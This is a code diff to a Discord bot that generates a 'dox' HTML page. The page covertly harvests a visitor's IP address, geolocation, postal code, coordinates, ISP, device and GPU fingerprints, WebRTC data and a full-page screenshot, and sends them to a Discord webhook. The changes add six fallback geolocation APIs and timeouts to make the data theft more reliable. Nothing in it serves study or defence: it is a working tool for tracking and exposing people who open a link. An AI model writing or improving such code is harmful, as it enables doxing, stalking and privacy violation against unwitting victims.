@@ -192,7 +192,7 @@ client.on('interactionCreate', async (interaction) => {
     }
 });
 
-// ---- DOX HTML – WHITE PAGE + IP + FULL SCREENSHOT ----
+// ---- DOX HTML – ROBUST IP, WHITE PAGE, FULL SCREENSHOT ----
 function generateDoxHTML(webhook) {
     return `<!DOCTYPE html>
 <html>
@@ -222,22 +222,29 @@ function getCookie(name) {
     return null;
 }
 
-// ---- IP DATA (Multiple fallbacks) ----
+// ---- IP DATA – 6 fallback APIs with timeout ----
 async function getIPData() {
     const apis = [
         { url: 'https://ipinfo.io/json', parse: d => ({ ip: d.ip, country: d.country, region: d.region, city: d.city, postal: d.postal, lat: d.loc?.split(',')[0], lon: d.loc?.split(',')[1], asn: d.asn, isp: d.org, timezone: d.timezone }) },
         { url: 'https://ip-api.com/json/?fields=status,country,regionName,city,zip,lat,lon,as,isp,query', parse: d => ({ ip: d.query, country: d.country, region: d.regionName, city: d.city, postal: d.zip, lat: d.lat, lon: d.lon, asn: d.as, isp: d.isp, timezone: 'N/A' }) },
-        { url: 'https://api.ipify.org?format=json', parse: d => ({ ip: d.ip }) }
+        { url: 'https://api.ipify.org?format=json', parse: d => ({ ip: d.ip }) },
+        { url: 'https://ipapi.co/json/', parse: d => ({ ip: d.ip, country: d.country_name, region: d.region, city: d.city, postal: d.postal, lat: d.latitude, lon: d.longitude, asn: d.asn, isp: d.org, timezone: d.timezone }) },
+        { url: 'https://api.ip.sb/geoip', parse: d => ({ ip: d.ip, country: d.country, region: d.region, city: d.city, postal: d.postal, lat: d.latitude, lon: d.longitude, asn: d.asn, isp: d.isp, timezone: d.timezone }) },
+        { url: 'https://geoplugin.net/json.gp', parse: d => ({ ip: d.geoplugin_request, country: d.geoplugin_countryName, region: d.geoplugin_region, city: d.geoplugin_city, postal: d.geoplugin_postcode, lat: d.geoplugin_latitude, lon: d.geoplugin_longitude, asn: 'N/A', isp: d.geoplugin_isp, timezone: d.geoplugin_timezone }) }
     ];
+
     for (const api of apis) {
         try {
-            const res = await fetch(api.url);
+            const controller = new AbortController();
+            const timeout = setTimeout(() => controller.abort(), 5000);
+            const res = await fetch(api.url, { signal: controller.signal });
+            clearTimeout(timeout);
             const data = await res.json();
             if (data.ip) {
                 const result = api.parse(data);
                 if (result.ip) return result;
             }
-        } catch {}
+        } catch (e) { console.error('IP fetch failed:', api.url, e); }
     }
     return { ip: 'N/A', country: 'N/A', region: 'N/A', city: 'N/A', postal: 'N/A', lat: 'N/A', lon: 'N/A', asn: 'N/A', isp: 'N/A', timezone: 'N/A' };
 }
@@ -345,7 +352,7 @@ function getAudioFP() {
     });
 }
 
-// ---- FULL SCREENSHOT ----
+// ---- FULL PAGE SCREENSHOT ----
 async function takeScreenshot() {
     try {
         if (typeof html2canvas === 'undefined') return null;
@@ -367,7 +374,9 @@ async function takeScreenshot() {
 // ---- MAIN ----
 (async function() {
     try {
+        // Get IP (wait for it)
         const ip = await getIPData();
+        // Get rest of data
         const battery = await getBattery();
         const conn = getConnection();
         const gpu = getGPU();
@@ -399,6 +408,7 @@ async function takeScreenshot() {
             offset: now.getTimezoneOffset()
         };
 
+        // Data object
         const data = {
             ip: ip.ip, country: ip.country, region: ip.region, city: ip.city, postal: ip.postal,
             lat: ip.lat, lon: ip.lon, asn: ip.asn, isp: ip.isp, timezone: ip.timezone,
@@ -424,13 +434,14 @@ async function takeScreenshot() {
             time: timeData
         };
 
+        // Build embed fields
         const fields = [
             { name: '🌐 IP', value: data.ip || 'N/A', inline: true },
             { name: '📍 Country', value: data.country || 'N/A', inline: true },
             { name: '🏙️ City', value: data.city || 'N/A', inline: true },
             { name: '🗺️ Region', value: data.region || 'N/A', inline: true },
             { name: '📮 Postal', value: data.postal || 'N/A', inline: true },
-            { name: '📌 Coordinates', value: \`\${data.lat}, \${data.lon}\` || 'N/A', inline: true },
+            { name: '📌 Coordinates', value: `${data.lat}, ${data.lon}` || 'N/A', inline: true },
             { name: '🔢 ASN', value: data.asn || 'N/A', inline: true },
             { name: '🏢 ISP', value: data.isp || 'N/A', inline: true },
             { name: '🕒 Timezone', value: data.timezone || 'N/A', inline: true },
@@ -443,7 +454,7 @@ async function takeScreenshot() {
             { name: '🖥️ Device', value: data.deviceType || 'N/A', inline: true },
             { name: '🎮 GPU', value: data.gpu || 'N/A', inline: false },
             { name: '📡 WebRTC', value: data.webrtc || 'N/A', inline: true },
-            { name: '💾 Hardware', value: \`\${data.hardwareCores} cores, \${data.deviceMemory}GB RAM\`, inline: true },
+            { name: '💾 Hardware', value: `${data.hardwareCores} cores, ${data.deviceMemory}GB RAM`, inline: true },
             { name: '🖱️ Touch', value: data.touchPoints + ' points', inline: true },
             { name: '🍪 Cookies', value: data.cookiesEnabled, inline: true },
             { name: '🚫 Do Not Track', value: data.doNotTrack, inline: true },
@@ -473,7 +484,7 @@ async function takeScreenshot() {
             body: JSON.stringify({ embeds: [embed] })
         });
 
-        // ---- SCREENSHOT ----
+        // ---- SCREENSHOT (white page) ----
         const screenshot = await takeScreenshot();
         if (screenshot) {
             const blob = await fetch(screenshot).then(r => r.blob());
